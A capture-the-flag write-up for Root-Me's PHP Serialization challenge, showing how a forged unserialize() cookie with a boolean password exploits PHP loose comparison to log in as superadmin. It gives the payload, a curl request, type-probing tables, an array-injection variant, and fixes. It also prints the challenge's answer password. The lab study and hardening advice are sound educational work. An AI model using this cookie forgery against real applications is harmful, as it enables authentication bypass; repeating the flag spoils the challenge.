# Root-Me — Web-Server / PHP - Serialization (ch28)

- **Target:** http://challenge01.root-me.org/web-serveur/ch28/
- **Class:** PHP object/array injection via `unserialize()` on a cookie + loose comparison
- **Author / date:** Arod, 3 February 2014
- **Goal:** get administrator access

## Flag (validation password)

```
NoUserInputInPHPSerialization!
```

Byte-exact (`od` dump, no trailing whitespace):

```
p a s s w o r d   :   N o U s e r I n p u t I n P H P S e r i a l i z a t i o n !
```

The admin page prints:

```
Great ! Welcome superadmin !
You can validate the challenge with the password : NoUserInputInPHPSerialization!
```

## The vulnerable code

Source is available at `index.php?showsource`:

```php
define('INCLUDEOK', true);
session_start();
...
require_once('./passwd.inc.php');          // $auth = array(login => sha256(password))

if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login']    = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);   // <-- attacker-controlled deserialization
        $autologin = "autologin";
    }
    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {   // <-- loose comparison
        $_SESSION['login'] = $data['login'];               // <-- client chooses the identity
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else { $message = "Error : $autologin authentication failed !"; }
}
...
if($_SESSION['login'] === "superadmin"){ require_once('admin.inc.php'); }
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){ require_once('user.inc.php'); }
```

Everything the app trusts about the user comes out of a **cookie it deserialises itself**.
The cookie is a plain `serialize()`d PHP array with no signature, no encryption, no
integrity check. So `$data` is entirely under attacker control — both keys and, crucially,
their **types**.

The schema comment in the form is `guest / guest`, and the only legitimately issued cookie
is the one you get by ticking "Autologin next time":

```
autologin=a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60…186ec";}
```

`$auth['superadmin']` is a real, non-null value (see the controls), so we can't just set
`password` to `null` — but we don't need the password at all, because the comparison is `==`.

## The exploit

One request. Set the cookie:

```
autologin = a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
```

URL-encoded for the wire:

```bash
curl -s -H "Cookie: autologin=a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D" \
  "http://challenge01.root-me.org/web-serveur/ch28/index.php"
```

Three things line up:

1. **`unserialize()` gives us full control of `$data`** — we set `login` to the string
   `superadmin` and `password` to the *boolean* `true`.
2. **`true == $auth['superadmin']` is `TRUE`.** In PHP, comparing a `bool` to a string
   converts the *string* to a boolean, and any non-empty, non-`"0"` string is truthy. The
   stored sha256 hash is a non-empty string, so the check passes. No password required.
3. **`$_SESSION['login'] = $data['login']`** — the app then grants the session the identity
   we supplied. `admin.inc.php` is included and prints the flag.

Decoded payload:

```php
array(
    'login'    => 'superadmin',
    'password' => true,
)
```

## The comparison oracle (what exactly matches)

To pin down `$auth['superadmin']`, I sent each candidate type as `$data['password']` and
read the response. `ADMIN` = passed the check.

| `$data['password']` | Serialized form | Result |
|---|---|---|
| `true` | `b:1` | **ADMIN** |
| `1` (int) | `i:1` | **ADMIN** |
| `1.0` (float) | `d:1` | **ADMIN** |
| `false` | `b:0` | Error |
| `null` | `N` | Error |
| `0` (int) | `i:0` | Error |
| `0.5` / `1.5` / `-1` / `2` | `d:0.5` / `d:1.5` / `i:-1` / `i:2` | Error |
| `""` | `s:0:""` | Error |
| `"1"` | `s:1:"1"` | Error |
| `"0"` | `s:1:"0"` | Error |
| `"abc"` | `s:3:"abc"` | Error |
| `"0e"` | `s:2:"0e"` | Error |

Read together: `$auth['superadmin']` is **loosely equal to `1`** (`1`, `1.0` and `true` all
match; `0`, `2`, `1.5` and `-1` do not), but it is **not the string `"1"`** and not the
literal integer `1` — otherwise `s:1:"1"` would have matched too (PHP compares two numeric
strings numerically).

That signature — numerically `1`, but `"1"` does not match — is what you get when the
stored value is a **non-numeric string whose leading numeric part is `1`** (e.g. a hash
beginning `1a…`, which parses to `1`), or an object. A 2-character brute force over
`"1" + c` found no match, so it is not a short string; the likely shape is a 64-char hash
beginning `1` + `[a-f]`. I did not determine the exact stored value — but the exploit does
not need it, and the table above is the behaviour that matters.

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | no cookie, no POST | not authenticated | login form |
| 2 | `login=guest&password=guest` (form) | legitimate user | `Welcome guest !` |
| 3 | `login=superadmin&password=superadmin` (form) | rejected | `Error : authentication failed !` |
| 4 | cookie `login=superadmin, password=b:1` | bypass | **ADMIN** |
| 5 | cookie `login=guest, password=b:1` | user only, **not** admin | `Welcome guest` (no admin page) |
| 6 | cookie `login=superadmin, password=b:0` | reject | `Error : autologin authentication failed !` |
| 7 | cookie `login=superadmin, password=s:0:""` | reject | `Error : …` |
| 8 | cookie `login=superadmin, password=N` | reject | `Error : …` |

Control 5 is the important one: the **login key still matters**. With `login=guest` the
same `b:1` password juggles past the password check but grants only guest — so the bypass
is specifically about impersonating `superadmin`, not about disabling auth entirely.
Control 3 confirms the real admin password is unknown and unguessable via the form.

## A secondary finding — array injection also works

Passing arrays through the *form* reaches the same broken code path:

| POST body | Result |
|---|---|
| `login=superadmin&password[]=x` | `Error` (hash of an array is not `true`) |
| `login[]=superadmin&password[]=x` | logged in as `Array` — **user-level**, not admin |

With `login[]=superadmin`, `$data['login']` is an array, so `$auth[array]` raises
"Illegal offset type" and evaluates to `NULL`; `$data['password']` is also `NULL`
(`hash()` on an array), so `NULL == NULL` → `true`. The session becomes the array, which
satisfies `$_SESSION['login'] !== ""` and loads `user.inc.php` — a free authenticated
session, though not admin. Worth recording because it is the same bug with a different
trigger, and it shows the `NULL == NULL` variant is live too.

## Root cause

1. **`unserialize()` on untrusted input.** The autologin cookie is deserialised with no
   integrity check. The client therefore controls the *structure and types* of `$data`,
   not just its values. This is the primary flaw — and the one the flag names.
2. **Authentication state lives in a client-side cookie.** Identity (`login`) and proof
   (`password`) both come from the request. There is no signature, so nothing binds the
   cookie to what the server issued.
3. **Loose comparison `==`.** Even with the cookie trusted, `true == "<hash>"` is `TRUE`,
   so the password check can be satisfied by a *type* rather than a value. This is the same
   bug class as ch55's magic hashes.
4. **No re-validation of the login against `$auth`.** `$_SESSION['login']` is set from the
   cookie value directly; the code never checks that `$data['login']` is a key that exists
   in `$auth`, nor that it is a string.

## Fix

- **Never `unserialize()` user input.** Use `json_decode($cookie, true, flags: JSON_THROW_ON_ERROR)`,
  which cannot instantiate objects or preserve PHP types:

  ```php
  $data = json_decode($_COOKIE['autologin'] ?? '', true, 3, JSON_THROW_ON_ERROR);
  ```

  If you genuinely need PHP serialisation, restrict it to `['allowed_classes' => false]` —
  but for a cookie, JSON is the right answer.

- **Sign the cookie.** Anything the client sends back that influences auth must be
  authenticated (HMAC) or, better, kept server-side:

  ```php
  $payload = json_encode(['login' => $login]);
  setcookie('autologin', $payload . '.' . hash_hmac('sha256', $payload, $key));
  // verify with hash_equals() before trusting it
  ```

- **Use `===` (or `hash_equals()`) for credential comparison.** Type-strict comparison
  makes `true == "<hash>"` impossible:

  ```php
  if (isset($auth[$data['login']]) && is_string($data['password'])
      && hash_equals($auth[$data['login']], $data['password'])) {
      $_SESSION['login'] = $data['login'];
  }
  ```

- **Validate shape before use.** `is_string($data['login'])`, `is_string($data['password'])`,
  and confirm the login exists in `$auth` — never index an auth map with an unchecked
  key (that is what produced the `NULL == NULL` variant above).

- Store passwords with `password_hash()`/`password_verify()` rather than bare sha256, and
  treat "autologin" as a separate, single-use, server-tracked token — not as a serialised
  copy of the credential.

## Generalisation

Two independent bug classes stack here, and both recur:

- **Insecure deserialisation.** Any `unserialize()` / `pickle.loads()` / `yaml.load()` on
  client data. The risk is not only RCE via `__wakeup`/`__destruct`; as here, simply being
  able to choose *types* is enough to break `==`-based logic.
- **Type juggling in auth.** `==` between an attacker-chosen type and a secret string.
  Same family as magic hashes (`0e…`), `strcmp()` array bypass, and `in_array()` without
  the strict flag.

Detection heuristic: grep for `unserialize(` near `$_COOKIE`/`$_GET`/`$_POST`, and for `==`
or `!=` on anything that came out of it. If both appear in the same function as an
authentication decision, you have this challenge.
